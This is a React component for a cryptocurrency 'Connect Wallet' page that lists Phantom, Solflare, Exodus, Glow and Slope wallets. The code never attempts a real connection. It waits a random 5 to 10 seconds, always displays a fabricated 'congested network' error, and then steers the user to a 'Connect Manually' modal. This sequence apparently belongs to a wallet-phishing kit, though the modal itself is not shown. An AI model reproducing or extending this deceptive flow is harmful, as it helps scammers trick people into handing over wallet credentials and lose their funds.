import { motion, AnimatePresence } from "framer-motion";
import { ArrowLeft, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { Button } from "../ui/button";
import { useState } from "react";
import { toast } from "sonner";
import { ManualConnectModal } from "../ui/ManualConnectModal";
import phantomIcon from "/src/assets/PhantomWalletIcon.svg";
import solflareIcon from "/src/assets/SolFlareIcon.png";
import exodusIcon from "/src/assets/ExodusIcon.svg";
import glowIcon from "/src/assets/GlowWallet.png";
import slopeIcon from "/src/assets/SlopeWallet.png";

const wallets = [
  {
    name: "Phantom",
    icon: phantomIcon,
    url: "https://phantom.app/"
  },
  {
    name: "Solflare",
    icon: solflareIcon,
    url: "https://solflare.com/"
  },
  {
    name: "Exodus",
    icon: exodusIcon,
    url: "https://www.exodus.com/"
  },
  {
    name: "Glow Wallet",
    icon: glowIcon,
    url: "https://glow.app/"
  },
  {
    name: "Slope",
    icon: slopeIcon,
    url: "https://slope.finance/"
  }
];

export function ConnectWallet() {
  const navigate = useNavigate();
  const [loadingWallet, setLoadingWallet] = useState(null);
  const [showManualConnect, setShowManualConnect] = useState(null);
  const [isManualConnectOpen, setIsManualConnectOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);

  const connectWallet = async (wallet) => {
    setLoadingWallet(wallet.name);
    setShowManualConnect(null);

    const loadingTime = Math.random() * (10000 - 5000) + 5000;

    try {
      await new Promise(resolve => setTimeout(resolve, loadingTime));
      
      toast.error(`${wallet.name} cannot be connected due to congested network. Try again later or connect manually.`, {
        duration: 4000,
      });

      setTimeout(() => {
        setShowManualConnect(wallet.name);
      }, 2000);

    } finally {
      setLoadingWallet(null);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="min-h-screen bg-gradient-to-b from-gray-900 to-black 
        flex flex-col items-center justify-center p-4 sm:p-6"
    >
      {/* Back Button - Hide on very small screens */}
      <motion.div 
        className="absolute top-2 left-2 sm:top-4 sm:left-4"
        initial={{ x: -20, opacity: 0 }}
        animate={{ x: 0, opacity: 1 }}
      >
        <Button
          variant="ghost"
          onClick={() => navigate('/')}
          className="text-white hover:text-white/80 p-2 sm:p-4"
        >
          <ArrowLeft className="h-4 w-4 sm:mr-2" />
          <span className="hidden sm:inline">Back to Home</span>
        </Button>
      </motion.div>

      <motion.div className="w-full max-w-[400px] px-2 sm:px-0">
        {/* Header */}
        <div className="relative mb-6 sm:mb-8">
          <div className="absolute top-0 left-0 w-full h-full bg-blue-500/10 blur-[100px] rounded-full" />
          <h2 className="text-xl sm:text-2xl font-bold text-center text-white relative z-10">
            Connect Wallet
          </h2>
        </div>

        {/* Wallet options */}
        <div className="space-y-2 sm:space-y-3">
          {wallets.map((wallet, index) => (
            <motion.div
              key={wallet.name}
              initial={{ x: -20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              transition={{ delay: index * 0.1 }}
            >
              <button
                className="group relative w-full p-3 sm:p-4 rounded-xl
                  bg-gradient-to-r from-gray-800/50 to-gray-900/50
                  hover:from-gray-800 hover:to-gray-900
                  border border-gray-800 hover:border-gray-700
                  transition-all duration-300 ease-out
                  active:scale-[0.98]"
                onClick={() => connectWallet(wallet)}
                disabled={loadingWallet === wallet.name}
              >
                <div className="flex items-center gap-3 sm:gap-4">
                  {/* Icon container */}
                  <div className="relative w-8 h-8 sm:w-10 sm:h-10 rounded-full 
                    bg-gradient-to-br from-gray-800 to-gray-900
                    flex items-center justify-center border border-gray-700">
                    <img
                      src={wallet.icon}
                      alt={wallet.name}
                      className="w-5 h-5 sm:w-6 sm:h-6 object-contain"
                    />
                  </div>

                  {/* Wallet name and loading state */}
                  <div className="flex-1 text-left">
                    <span className="font-medium text-sm sm:text-base text-gray-100">
                      {wallet.name}
                    </span>
                    
                    {/* Loading Animation */}
                    <AnimatePresence>
                      {loadingWallet === wallet.name && (
                        <motion.div
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: "auto" }}
                          exit={{ opacity: 0, height: 0 }}
                          className="text-xs sm:text-sm text-blue-400 flex items-center gap-2 mt-1 sm:mt-2"
                        >
                          <Loader2 className="h-3 w-3 sm:h-4 sm:w-4 animate-spin" />
                          Connecting...
                        </motion.div>
                      )}
                    </AnimatePresence>

                    {/* Manual Connect Button */}
                    <AnimatePresence>
                      {showManualConnect === wallet.name && (
                        <motion.div
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: "auto" }}
                          exit={{ opacity: 0, height: 0 }}
                          className="mt-2"
                        >
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-xs sm:text-sm text-blue-400 border-blue-400 
                              hover:bg-blue-400/10 active:scale-95"
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedWallet(wallet);
                              setIsManualConnectOpen(true);
                            }}
                          >
                            Connect Manually
                          </Button>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>

                  {/* Arrow indicator */}
                  <div className="ml-auto opacity-0 group-hover:opacity-100 
                    transform translate-x-2 group-hover:translate-x-0
                    transition-all duration-300">
                    →
                  </div>
                </div>
              </button>
            </motion.div>
          ))}
        </div>
      </motion.div>

      <ManualConnectModal
        isOpen={isManualConnectOpen}
        setIsOpen={setIsManualConnectOpen}
        wallet={selectedWallet}
      />
    </motion.div>
  );
}
